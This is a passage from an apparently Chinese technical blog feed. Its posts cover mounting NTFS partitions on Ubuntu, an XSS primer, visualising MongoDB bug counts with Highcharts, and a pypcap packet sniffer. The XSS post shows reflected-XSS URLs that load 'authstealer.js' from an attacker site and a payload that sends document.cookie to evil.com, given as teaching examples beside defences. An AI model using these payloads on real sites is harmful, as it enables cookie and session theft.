PARTUUID=&quot;45ed07d2-c9e3-4167-8868-3e33f62784e1&quot;/dev/sdb2: LABEL=&quot;Data&quot; UUID=&quot;0000678400004823&quot; TYPE=&quot;ntfs&quot; PARTLABEL=&quot;Basic data partition&quot; PARTUUID=&quot;2a8b4bf1-8357-4d65-bed4-f73f01b96431&quot;/dev/sdb3: LABEL=&quot;Backup&quot; UUID=&quot;0000678400004823&quot; TYPE=&quot;ntfs&quot; PARTLABEL=&quot;Basic data partition&quot; PARTUUID=&quot;a7187083-2820-4eef-83ff-05d8899879a2&quot;</code></pre><p>从上面的输出结果就可以将Windows磁盘对应到具体的块设备路径<code>/dev/sdax</code>，因为电脑含两块磁盘，所以包含<code>sda</code>及<code>sdb</code>。这里的块设备路径和<code>UUID</code>会将下面的配置参数中用到。</p><h2 id="临时挂载方案"><a href="#临时挂载方案" class="headerlink" title="临时挂载方案"></a>临时挂载方案</h2><p>对于临时解决方案，可以使用以下指令将windows的C盘<code>/dev/sda1</code>挂载到<code>/mnt/c</code>目录</p><pre><code class="sh">sudo mkdir /mnt/csudo mount -t ntfs /dev/sda1 /mnt/c</code></pre><p>此临时方案在系统重启后就将失效。对于卸载，使用<code>sudo umount /mnt/c</code>即可。</p><h2 id="开机挂载方案"><a href="#开机挂载方案" class="headerlink" title="开机挂载方案"></a>开机挂载方案</h2><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>开机启动后自动挂载的方案就需要修改配置文件<code>/etc/fstab</code>啦,使用编辑器打开后，按以下格式添加新的挂载项</p><pre><code class="sh">$ cat /etc/fstab# /etc/fstab: static file system information.## Use &#39;blkid&#39; to print the universally unique identifier for a# device; this may be used with UUID= as a more robust way to name devices# that works even if disks are added and removed. See fstab(5).## &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;# / was on /dev/sdb5 during installationUUID=4d2e5a83-d9fe-47bb-aa02-fee9ac8535e3 /               ext4    errors=remount-ro 0       1# /boot was on /dev/sdb6 during installationUUID=9b521dc2-ad85-4ca6-bb8b-f285b312aa49 /boot           ext4    defaults        0       2# /home was on /dev/sdb7 during installationUUID=f6b796dd-9e59-4f79-b70a-c2c8e5977163 /home           ext4    defaults        0       2# swap was on /dev/sdb4 during installationUUID=9430ea0e-7ff9-4167-9bf7-1f3e08d26d34 none            swap    sw              0       0# /mnt/Data was on /dev/sdb2 during installation/dev/sdb2                                /mnt/Data        ntfs    defaults        0       2# /mnt/Backup was on /dev/sdb3 during installation/dev/sdb3                                /mnt/Backup      ntfs    defaults        0       2</code></pre><p>后面两项就是用来挂载Windows磁盘的，当然每行前面的<code>/dev/sdbx</code>也可以换成<code>UUID=xxxxx</code>，但是由于这两个磁盘的<code>UUID</code>一致，所以可能会有问题，也许可以使用<code>blkid</code>输出的<code>PARTUUID</code>，但我没试过。无论如何，以上的设置方法绝对是有效的。</p><h3 id="挂载测试"><a href="#挂载测试" class="headerlink" title="挂载测试"></a>挂载测试</h3><pre><code class="sh">sudo mkdir /mnt/&#123;Data,Backup&#125;sudo mount -a</code></pre><p>如果执行以上指令没有报错则说明挂载成功了，重启即可看到开机后系统已经自动挂载了设定号的磁盘。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> mount </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS跨站脚本攻击</title>
      <link href="2019/02/14/XSS/"/>
      <url>2019/02/14/XSS/</url>
      
        <content type="html"><![CDATA[<p>近期遇到一堆 Stored XSS vulnerability 问题，即存储型跨站脚本漏洞，所以有必要学习一下XSS相关的知识。</p><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p><code>XSS</code>是跨站脚本<code>Cross-Site Scripting</code>的简写，至于为什么不是<code>CSS</code>，相信大家很容易猜到，是为了避免与前端的层叠样式表<code>Cascading Style Sheets</code>重名。</p><p><code>XSS</code>涉及三个要素：一个站点，攻击者和受害者。攻击者通过某站点的漏洞注入脚本到该站点，受害者在使用浏览器访问该站点时就可能遭受<code>XSS</code>攻击。</p><p>脚本类型不限于<code>javascript</code>, 也可以是其它脚本，如<code>VBScript</code>, <code>ActiveX</code> 和 <code>flash</code>等，但主要还是以<code>javascript</code>为主。</p><span id="more"></span><h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><p><code>XSS</code>的分类貌似没有固定标准，但约定俗成的被分为持久化的存储型XSS和非持久化的反射型XSS。</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p><code>Stored XSS</code>, 持久化的，也就是说只要用户在浏览器打开了这个站点就会执行攻击者注入的脚本。此类<code>XSS</code>要求攻击者将脚本存储至站点服务器。</p><p>举个例子，很多论坛都有评论功能，攻击者可以通过评论把脚本信息存入站点服务器，如果站点未加过滤和编码，直接将脚本信息当做普通评论存入数据库，其他人访问该站点时就会执行该脚本。</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><code>Reflected XSS</code>, 非持久化的，需要用户打开站点后执行某些操作方能触发，比如点击某个链接，然后触发执行攻击者注入的脚本，脚本可以是一个代码段，也可以是指向攻击者提供的脚本链接。利用站点易受攻击的漏洞，就可以让用户执行任意脚本。</p><p>此类<code>XSS</code>攻击者通常使用邮件或是中间站点发送带有脚本的链接给用户，而链接往往看起来很正常，带有正规站点的域名，脚本部分可能使用16进制编码，不容易看出端倪。</p><p>下面引用的<a href="https://en.wikipedia.org/wiki/Cross-site_scripting#Non-persistent">维基百科</a>的例子:</p><pre><code class="yml"># 攻击者提供的链接，在访问bobssite.org的搜索功能时执行脚本http://bobssite.org/search?q=&lt;script%20type=&#39;application/javascript&#39;&gt;alert(&#39;xss&#39;);&lt;/script&gt;# 下面的链接触发后会执行攻击者服务器中的脚本authstealer.jshttp://bobssite.org/search?q=puppies&lt;script%20src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;&lt;/script&gt;# 下面是经过预先编码后的链接http://bobssite.org/search?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E</code></pre><h3 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM-Based XSS"></a>DOM-Based XSS</h3><p>基于DOM(Document Object Model)的<code>XSS</code>与以上两种不同的是，它完全发生在客户端，与服务器端无关，但同时又可以算是反射型<code>XSS</code>的子集，因为它也需要一定的交互才能触发。</p><p><code>DOM-Based XSS</code>原理：站点获取用户输入数据，然后通过站点自带的js代码修改<code>DOM</code>结构，如果输入的数据携带有恶意代码，就可能导致<code>XSS</code>攻击。</p><p>举个例子，以下代码用来显示访问链接（如：<code>http://www.example.com?name=test</code>）中携带的用户名</p><pre><code class="js">var namePos=document.URL.indexOf(&quot;name=&quot;)if (namePos != -1)&#123;    var name = document.createElement(&#39;span&#39;);    name.innerHTML = document.URL.substring(namePos, document.URL.length)&#125;</code></pre><p>如果用户名包含了恶意代码，如<code>&lt;/span&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;span&gt;</code>，这就会在原先想要生成的<code>span</code>标签后加入攻击者的脚本并执行。</p><h2 id="XSS攻击的危害与防范"><a href="#XSS攻击的危害与防范" class="headerlink" title="XSS攻击的危害与防范"></a>XSS攻击的危害与防范</h2><p>通过<code>XSS</code>攻击，攻击者可以获取用户的敏感信息，例如在用户完全不知情的情况下拿到用户登录后的<code>Cookie</code>信息，之后通过会话劫持冒充真实用户访问网站，和盗号一样，攻击者可以修改账户密码，获取账户内的私人信息甚至财产。更近一步，如果攻击者用此方法获取到了站点管理员的账户，那么将可能拿到站点的控制权。</p><p>具体例子可以参考<a href="https://www.acunetix.com/websitesecurity/cross-site-scripting/">Cross-site Scripting (XSS) Attack</a></p><pre><code class="js">window.location=&quot;http://evil.com/?cookie=&quot; + document.cookie</code></pre><p>那么<code>XSS</code>该如何防范呢？</p><ol><li><p>常用办法是进行特殊字符替换，对于所有的用户输入，需要进行过滤检查，对于上下文输出，将<code>&lt;&gt;/\#$&amp;?&#39;&quot;</code>等字符编码转义为对应的<code>html</code>码，这也是我们当前使用最多的方案；</p></li><li><p>对于不信任的用户输入，可以使用专门的机制（如：<a href="https://en.wikipedia.org/wiki/HTML_sanitization">HTML sanitization</a>）去辨别输入的有效性。</p></li><li><p>而对于<code>Cookie</code>，为了防止攻击者使用窃取的<code>Cookie</code>进行访问，可以通过绑定用户<code>IP</code>和<code>Cookie</code>，仅允许指定<code>IP</code>的用户使用特定<code>Cookie</code>才有效。</p></li></ol><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文简述了<code>XSS</code>的概念，介绍了存储型、反射型和<code>DOM-Based</code>三种<code>XSS</code>攻击手段，并予以举例说明，最后简单介绍了<code>XSS</code>危害及其常用防范手段。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.acunetix.com/websitesecurity/cross-site-scripting/">Cross-site Scripting (XSS) Attack</a></li><li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a></li><li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting">Wikipedia - Cross-site scripting</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之MongoDB数据分析及其Highcharts可视化</title>
      <link href="2019/01/22/highcharts/"/>
      <url>2019/01/22/highcharts/</url>
      
        <content type="html"><![CDATA[<p>近期使用<code>requests</code>把内部<code>bugziila</code>上的<code>bug</code>数据爬取了一遍，并存入了本地的<code>MongoDB</code>数据库，想着对数据做些简单的可视化处理，将所有产品的bug数做一个统计和可视化，于是便有了这篇简短的文章。</p><span id="more"></span><h2 id="MongoDB中的数据存储格式"><a href="#MongoDB中的数据存储格式" class="headerlink" title="MongoDB中的数据存储格式"></a>MongoDB中的数据存储格式</h2><p>之前爬取数据后，存入<code>MongoDB</code>的数据格式如下，而我要分析的仅仅是其中的<code>metadata.Product</code></p><pre><code class="json">&#123;    &quot;_id&quot; : ObjectId(&quot;5c3ea1d3fbf7884588041acc&quot;),    &quot;id&quot; : 1,    &quot;title&quot; : &quot;\&quot;Show interface dot11radio advanced\&quot; command doesn&#39;t work&quot;,    &quot;metadata&quot; : &#123;        &quot;Status&quot; : &quot;已解決 (RESOLVED) 已修復 (FIXED)&quot;,        &quot;Product&quot; : &quot;AP54GTSW&quot;,        &quot;Component&quot; : &quot;Baseline&quot;,        &quot;Version&quot; : &quot;0.1&quot;,        &quot;Platform&quot; : &quot;PC Linux&quot;,        &quot;Importance&quot; : &quot;P2 normal&quot;,        &quot;Assigned&quot; : &quot;Wallace Peng&quot;,        &quot;Reported_author&quot; : &quot;happy Hu&quot;,        &quot;Reported&quot; : &quot;2004-05-11 20:32 CST&quot;,        &quot;Modified&quot; : &quot;2010-08-27 15:42 CST&quot;    &#125;,    &quot;comments&quot; : &#123;        &quot;描述&quot; : &#123;            &quot;user&quot; : &quot;happy Hu&quot;,            &quot;time&quot; : &quot;2004-05-11 20:32:24 CST&quot;,            &quot;text&quot; : &quot;\&quot;Show interface dot11radio advanced\&quot; command doesn&#39;t work -- Happy&quot;        &#125;,        &quot;意見1&quot; : &#123;            &quot;user&quot; : &quot;Wallace Peng&quot;,            &quot;time&quot; : &quot;2004-05-12 21:01:56 CST&quot;,            &quot;text&quot; : &quot;image 0.1rc8 fixed this bug. -- Wallace&quot;        &#125;    &#125;&#125;</code></pre><h2 id="读取MongoDB数据"><a href="#读取MongoDB数据" class="headerlink" title="读取MongoDB数据"></a>读取MongoDB数据</h2><h3 id="获取所有产品名称"><a href="#获取所有产品名称" class="headerlink" title="获取所有产品名称"></a>获取所有产品名称</h3><p>首先获取所有产品名称，可以通过<code>pymongo</code>库的find函数获取<code>metadata.Product</code>段数据。</p><pre><code class="python">from pymongo import MongoClientimport osMONGOSERVER = &#39;localhost:27017&#39;DATABASE = &#39;bugzilla&#39;COLLECTION = &#39;bugs&#39;class Analysis(object):    def __init__(self):        client = MongoClient(MONGOSERVER)        db = client[DATABASE]        self.col = db[COLLECTION]    def getAllProductsName(self):        records = self.col.find(&#123;&#125;, &#123;&#39;metadata.Product&#39;:1, &#39;_id&#39;:0&#125;)        prdoucts = [ record[&#39;metadata&#39;][&#39;Product&#39;] for record in records ]        prdoucts = list(set(prdoucts))        prdoucts = sorted(prdoucts, key=lambda s: s.lower())        return prdoucts</code></pre><p><code>MongoClient</code>用来打开一个client去连接数据库，通过指定<code>database</code>和<code>collection</code>可以定位到数据源，再用<code>find</code>函数检索出产品名称信息。以上的<code>getAllProductsName</code>后面通过<code>set</code>集合的方式去重，最后通过<code>sorted</code>进行排序，即可获得有序的产品名称<code>products</code>。</p><h3 id="获取产品bug数"><a href="#获取产品bug数" class="headerlink" title="获取产品bug数"></a>获取产品bug数</h3><p>当然，我们想要的其实是产品bug数量，对于单个产品，可以通过<code>pymongo</code>库的<code>count_documents</code>函数获得该指定产品bug数。</p><pre><code class="py">    def countOneProduct(self, product):        return self.col.count_documents(&#123;&#39;metadata.Product&#39;:product&#125;)  </code></pre><p>想要获取所有的产品bug数，简单的想法当然是循环调用<code>countOneProduct</code>函数，但这样会需要大量的时间，9万多条数据量需24s左右的时间。为什么这么久，因为每次执行<code>count_documents</code>都需要重新遍历一遍数据库，这显然是不合适的。更好的方法是只遍历一遍数据库，然后对不同产品的bug数进行区分统计。</p><pre><code class="py">    def countAllProducts(self):        counts = &#123;&#125;        records = self.col.find(&#123;&#125;, &#123;&#39;metadata.Product&#39;:1, &#39;_id&#39;:0&#125;)        prdoucts = [ record[&#39;metadata&#39;][&#39;Product&#39;] for record in records ]        for product in prdoucts:            if product in counts:                counts[product] += 1            else:                counts[product] = 1        counts = sorted(counts.items(), key=lambda item: item[0].lower())        return counts</code></pre><p>以上代码段首先找出数据库每条记录的<code>metadata.Product</code>信息，然后循环判别<code>product</code>名称，对不同产品的出现次数进行计数，然后存入相应的字典记录<code>counts[product]</code>中，总耗时约1s。</p><h3 id="保存数据至json文件"><a href="#保存数据至json文件" class="headerlink" title="保存数据至json文件"></a>保存数据至json文件</h3><pre><code class="py">    def saveProductsIssues(self, path):        counts = self.countAllProducts()        with open(path, &#39;w&#39;, encoding=&#39;utf-8&#39;) as f:            f.write(&#39;&#123;\n&#39;)            f.write(&#39;,\n&#39;.join([&#39;&quot;&#123;&#125;&quot;:&#123;&#125;&#39;.format(key, val) for key,val in counts]))            f.write(&#39;\n&#125;&#39;)</code></pre><p>保存数据时，需要使用<code>utf-8</code>格式，否则可能出现后续可视化时的中文乱码问题。</p><h2 id="Highcharts数据可视化"><a href="#Highcharts数据可视化" class="headerlink" title="Highcharts数据可视化"></a>Highcharts数据可视化</h2><p><a href="https://www.highcharts.com/">Highcharts</a>是一款超级棒的用于<code>web</code>端数据可视化的<code>js</code>库，图表样式及其丰富，使用简单，强烈推荐！！！</p><p>我们要做的就是把<code>highcharts</code>的js库文件下载到本地，然后拷贝一个例程，最后修改一下数据来源即可，下面是针对<code>bug</code>数选择的一个图表样式对应的<code>html</code>文件</p><pre><code class="html">&lt;!DOCTYPE HTML&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;        &lt;title&gt;Highcharts Example&lt;/title&gt;        &lt;style type=&quot;text/css&quot;&gt;        &lt;/style&gt;    &lt;/head&gt;&lt;body&gt;&lt;!-- 下面是需要引入的库，包含JQuery及highcharts库 --&gt;&lt;script src=&quot;https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./code/highcharts.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./code/modules/exporting.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./code/modules/export-data.js&quot;&gt;&lt;/script&gt;&lt;!-- 根据数据量大小修改下方的显示范围 --&gt;&lt;div id=&quot;container&quot; style=&quot;min-width: 310px; max-width: 800px; height: 600px; margin: 0 auto&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;// 使用$.ajax导入数据，并配置Highcharts参数$.ajax(&#123;    url: &#39;products.json&#39;,    dataType: &#39;json&#39;,    contentType: &#39;application/json; charset=utf-8&#39;,    success: function (src) &#123;        var categories = new Array();        var data = new Array();        for (item in src)&#123;            categories.push(item)            data.push(src[item])        &#125;        Highcharts.chart(&#39;container&#39;, &#123;            chart: &#123;                type: &#39;bar&#39;            &#125;,            title: &#123;                text: &#39;All products issues number on bugzilla&#39;            &#125;,            subtitle: &#123;                text: &#39;Source: bugzilla&#39;            &#125;,            xAxis: &#123;                // 更改分类                categories: categories,                title: &#123;                    text: null                &#125;            &#125;,            yAxis: &#123;                min: 0,                title: &#123;                    text: &#39;Issues&#39;,                    align: &#39;high&#39;                &#125;,                labels: &#123;                    overflow: &#39;justify&#39;                &#125;            &#125;,            tooltip: &#123;                valueSuffix: &#39;&#39;            &#125;,            plotOptions: &#123;                bar: &#123;                    dataLabels: &#123;                        enabled: true                    &#125;                &#125;            &#125;,            legend: &#123;                layout: &#39;vertical&#39;,                align: &#39;right&#39;,                verticalAlign: &#39;top&#39;,                x: -40,                y: 80,                floating: true,                borderWidth: 1,                backgroundColor: ((Highcharts.theme &amp;&amp; Highcharts.theme.legendBackgroundColor) || &#39;#FFFFFF&#39;),                shadow: true            &#125;,            credits: &#123;                enabled: false            &#125;,            series: [&#123;                name: &#39;Issues Number&#39;,                // 更改数据来源                data: data            &#125;]        &#125;);    &#125;&#125;)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>以上最主要的一段代码如下，通过JQuery的ajax读取web server中的json文件，同时将json数据的key和value分离至<code>categories</code>和<code>data</code></p><pre><code class="js">$.ajax(&#123;    url: &#39;products.json&#39;,    dataType: &#39;json&#39;,    contentType: &#39;application/json; charset=utf-8&#39;,    success: function (src) &#123;        var categories = new Array();        var data = new Array();        for (item in src)&#123;            categories.push(item)            data.push(src[item])        &#125;</code></pre><h3 id="可视化效果展示"><a href="#可视化效果展示" class="headerlink" title="可视化效果展示"></a>可视化效果展示</h3><p>为了方便展示，我仅仅截取了一段数据，<code>product</code>名称做了随机替换处理，毕竟主要还是看可视化效果嘛。</p><p><img src="/assets/highcharts/all-products-issues.svg" alt="Product bugs"></p><h2 id="随机替换字符串"><a href="#随机替换字符串" class="headerlink" title="随机替换字符串"></a>随机替换字符串</h2><p>上面提到对<code>product</code>名称进行随机替换处理，其代码如下：</p><pre><code class="py">import jsonimport secretsimport stringimport numpy as npwith open(&#39;products.json&#39;,&#39;r&#39;,encoding=&#39;utf-8&#39;) as f:    data = json.load(f)new = &#123;&#125;for key, val in data.items():    N = np.random.randint(5,20)    key = &#39;&#39;.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(N))    new[key] = valwith open(&#39;products_new.json&#39;,&#39;w&#39;,encoding=&#39;utf-8&#39;) as f:    json.dump(new, f, indent=4)</code></pre><p>该替换方法参考以下文章:</p><ul><li><a href="https://codeday.me/bug/20180821/225180.html">在Python 3中生成随机长度的随机类字符串的最快方法</a></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文介绍了如何检索<code>MongoDB</code>中的数据，如何将数据存入json文件，以及如何使用<code>highcharts</code>实现数据可视化，最后给出了随机替换字符串的一种实现方法。</p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> visualization </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之pypcap库的安装及简单抓包工具的实现</title>
      <link href="2018/12/31/pypcap-install/"/>
      <url>2018/12/31/pypcap-install/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/pynetwork/pypcap">pypcap</a>是一个对<code>libpcap</code>C库进行封装和简化的面向对象的抓包工具库，可以非常方便的用于抓包和过滤，结合<code>dpkt</code>解析库可以完成许多网络数据包的抓取和分析。本文讲述的就是如何使用<code>pypcap</code>及<code>dpkt</code>库实现简单抓包工具，也称为嗅探器(sniffer).</p><h2 id="Linux-端安装-pypcap"><a href="#Linux-端安装-pypcap" class="headerlink" title="Linux 端安装 pypcap"></a>Linux 端安装 pypcap</h2><pre><code class="bash">sudo apt-get install libpcap-devsudo pip install pypcap</code></pre><p>这里有个问题,如果使用<code>Anaconda</code>目录的<code>pip</code>安装则可能失败,目前原因未明,但官方的<code>python3</code>对应的<code>pip3</code>及<code>python2</code>对应的<code>pip</code>均无此问题.</p><span id="more"></span><h2 id="Windows-端安装-pypcap"><a href="#Windows-端安装-pypcap" class="headerlink" title="Windows 端安装 pypcap"></a>Windows 端安装 pypcap</h2><p>根据<code>pypcap</code>官方说明：</p><blockquote><p>WinPcap has compatibility issues with Windows 10, therefore it&#39;s recommended to use Npcap (Nmap&#39;s packet sniffing library for Windows, based on the WinPcap/Libpcap libraries, but with improved speed, portability, security, and efficiency). Please enable WinPcap API-compatible mode during the library installation.</p></blockquote><p>这里提到<code>winpcap</code>与<code>win10</code>间存在兼容性问题，具体什么问题我也没搞清楚，之前使用<code>wireshark</code>抓包一直用的<code>winpcap</code>也没问题。不过我估计和后面要用到的<code>npcap sdk</code>有关吧。既如此，就需要在安装<code>pypcap</code>前安装好<code>Npcap</code>，并下载好<code>Npcap SDK</code>。</p><h3 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h3><ol><li><a href="https://github.com/pynetwork/pypcap/releases">pypcap 源码</a></li><li><a href="https://nmap.org/npcap/#download">Npcap</a></li><li><a href="https://nmap.org/npcap/#download">Npcap SDK</a></li></ol><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul><li>安装Npcap</li></ul><p>安装下载后的Npcap安装包，如果电脑带有无线网卡，记得勾选“support raw 802.11 traffic(and monitor mode) for wireless adapters”。需要注意的是，如果电脑已经安装过<code>winpcap</code>软件，在安装<code>Npcap</code>时会弹窗提示卸载<code>Winpcap</code>,此时需要关闭wireshark或是其它相关的软件</p><ul><li>安装pypcap</li></ul><ol><li>将<code>Npcap SDK</code>文件夹和<code>pypcap</code>源码文件夹放在一个目录下</li><li>将<code>Npcap SDK</code>文件夹名称修改为<code>wpdpack</code></li><li>进入<code>pypcap</code>源码目录，执行<code>python setup.py install</code>即可完成安装</li></ol><p>在第三步需要注意的是，如果Python版本为3.7.2（其它大于3.7的版本没试过）有可能编译失败，因为有个头文件<code>pystate.h</code>在高版本会有更新，导致结构体<code>_ts PyThreadState</code>中的某些参数不识别，从而提示错误<code>pcap.c(22849): error C2039: &#39;exc_value&#39;: is not a member of &#39;_ts&#39;</code>等。之后我将版本换至3.6.6后便正常编译了。</p><p>安装完成后，可以进入<code>python</code>执行<code>import pcap</code>查看是否已经可以正常导入。</p><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><pre><code class="python">import pcap# list all of the Internet devicesdevs = pcap.findalldevs()print(*devs, sep=&#39;\n&#39;)pc = pcap.pcap(devs[3], promisc=True, immediate=True, timeout_ms=50)# fiter http pcaketspc.setfilter(&#39;tcp port 80&#39;)for ptime, pdata in pc:    print(ptime, pdata)</code></pre><p>接下来简单解释下几个主要函数</p><h3 id="findalldevs"><a href="#findalldevs" class="headerlink" title="findalldevs"></a>findalldevs</h3><p><code>findalldevs</code>可以列出当前操作系统的所有网络接口,但是<code>windows</code>和<code>Linux</code>的输出风格不大一样,下面来看看.</p><p>Linux版输出简单明了,若我猜的不错,输出的首个接口便是电脑的有线接口(本人台式机,Ubuntu系统),至少在我这是适用的.</p><pre><code class="zsh">➜ pythonPython 3.6.7 (default, Oct 22 2018, 11:32:17)[GCC 8.2.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import pcap&gt;&gt;&gt; pcap.findalldevs()[&#39;enp2s0&#39;, &#39;any&#39;, &#39;lo&#39;, &#39;nflog&#39;, &#39;nfqueue&#39;, &#39;usbmon1&#39;, &#39;usbmon2&#39;]&gt;&gt;&gt;</code></pre><p>在<code>ubuntu</code>及大部分Linux系统中,均可使用<code>ip route</code>或是<code>ifconfig</code>来获取接口名，据此甚至可以自动获取接口名．</p><p>Windows版则比较复杂，下面是某台电脑<code>win10</code>操作系统输出的结果，这个直接看是看不出什么的, 因为使用<code>cmd</code>指令<code>ipconfig /all</code>输出的接口信息并不包含以下内容，而是接口名称及描述信息等，如果想知道下面接口如何与接口名对应起来，可以参考后面抓包工具使用注册表来获取接口信息,或是打开<code>wireshark</code>抓包，每个报文的帧头都会显示当前接口的接口信息．</p><pre><code class="zsh">&gt;&gt;&gt; import pcap&gt;&gt;&gt; pcap.findalldevs()[&#39;\Device\NPF_&#123;839768E4-726A-48BB-9CEC-BD6FD670CB8F&#125;&#39;, &#39;\Device\NPF_&#123;C4D1AF17-C5C9-40C5-90F8-17781657FC9E&#125;&#39;, &#39;\Device\NPF_&#123;26024876-9711-428F-89D3-B91D2C488AC5&#125;&#39;, &#39;\Device\NPF_&#123;E26BFFEF-0644-4C13-8016-EB408AE1D471&#125;&#39;, &#39;\Device\NPF_&#123;9ED3674C-211E-4A57-923A-F8DBE6E6B704&#125;&#39;, &#39;\Device\NPF_&#123;A0B8B562-F309-44F3-95A1-BF34F5465925&#125;&#39;, &#39;\Device\NPF_&#123;9D76B006-6946-4C88-AED2-7F7A9194303C&#125;&#39;]</code></pre><h3 id="pcap-pcap"><a href="#pcap-pcap" class="headerlink" title="pcap.pcap"></a>pcap.pcap</h3><pre><code class="py">pc = pcap.pcap(devs[3], promisc=True, immediate=True, timeout_ms=50)</code></pre><p>以上代码定义了一个pcap对象，首个参数<code>devs[3]</code>对应接口名，<code>promisc</code>为真代表打开混杂模式，<code>immediate</code>代表立即模式，启用将不缓存数据包,<code>timeout_ms</code>代表接收数据包的超时时间</p><h3 id="setfilter"><a href="#setfilter" class="headerlink" title="setfilter"></a>setfilter</h3><p><code>setfilter</code>用来设置数据包过滤器，比如只想抓<code>http</code>的包，那就通过<code>setfilter(tcp port 80)</code>实现，更加详细的过滤规则请自行谷歌．</p><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><pre><code class="py">for ptime, pdata in pc:    print(ptime, pdata)</code></pre><p><code>pcap.pcap</code>对象pc是个动态数据，通常结合for循环或是while循环不断读取数据包，数据包会返回时间戳及报文数据．</p><p>上面这个小例子就是简单的说明<code>pcap</code>常用库函数的使用方法．具体的数据包的存储及解析需要由解析库<code>dpkt</code>来完成．下面是一个更加详细的抓包工具实例，可以完成数据包的抓取、解析及存储.</p><h2 id="简易抓包工具"><a href="#简易抓包工具" class="headerlink" title="简易抓包工具"></a>简易抓包工具</h2><pre><code class="python">#!/usr/bin/env python3# -*- encoding:utf-8 -*-import pcapimport dpktimport getoptimport sysimport datetimeimport timeimport osimport platformif &#39;Windows&#39; in platform.platform():    import winreg as wrIF_REG = r&#39;SYSTEM\CurrentControlSet\Control\Network\&#123;4d36e972-e325-11ce-bfc1-08002be10318&#125;&#39;def getInterfaceByName(name):    &#39;&#39;&#39;Get guid of interface from regedit of windows system    Args:        name: interface name    Returns:        An valid guid value or None.    Example:        getInterfaceByName(&#39;eth0&#39;)    &#39;&#39;&#39;    reg = wr.ConnectRegistry(None, wr.HKEY_LOCAL_MACHINE)    reg_key = wr.OpenKey(reg, IF_REG)    for i in range(wr.QueryInfoKey(reg_key)[0]):        subkey_name = wr.EnumKey(reg_key, i)        try:            reg_subkey = wr.OpenKey(reg_key, subkey_name + r&#39;\Connection&#39;)            Name = wr.QueryValueEx(reg_subkey, &#39;Name&#39;)[0]            wr.CloseKey(reg_subkey)            if Name == name:                return r&#39;\Device\NPF_&#39; + subkey_name        except FileNotFoundError as e:            pass    return Nonedef mac_addr(mac):    return &#39;%02x:%02x:%02x:%02x:%02x:%02x&#39;%tuple(mac)def ip_addr(ip):    return &#39;%d.%d.%d.%d&#39;%tuple(ip)def captureData(iface):    pkt = pcap.pcap(iface, promisc=True, immediate=True, timeout_ms=50)    # filter method    filters = &#123;        &#39;DNS&#39;: &#39;udp port 53&#39;,        &#39;HTTP&#39;: &#39;tcp port 80&#39;    &#125;    # pkt.setfilter(filters[&#39;HTTP&#39;])    pcap_filepath = &#39;pkts/pkts_&#123;&#125;.pcap&#39;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,        time.localtime()))    pcap_file = open(pcap_filepath, &#39;wb&#39;)    writer = dpkt.pcap.Writer(pcap_file)    print(&#39;Start capture...&#39;)    try:        pkts_count = 0        for ptime, pdata in pkt:            writer.writepkt(pdata, ptime)            # anlysisData(pdata)            printRawPkt(ptime, pdata)            pkts_count += 1    except KeyboardInterrupt as e:        writer.close()        pcap_file.close()        if not pkts_count:            os.remove(pcap_filepath)        print(&#39;%d packets received&#39;%(pkts_count))def printRawPkt(time, data):    eth = dpkt.ethernet.Ethernet(data)    print(&#39;Timestamp: &#39;, str(datetime.datetime.utcfromtimestamp(time)))    print(&#39;Ethernet Frame: &#39;, mac_addr(eth.src), mac_addr(eth.dst))  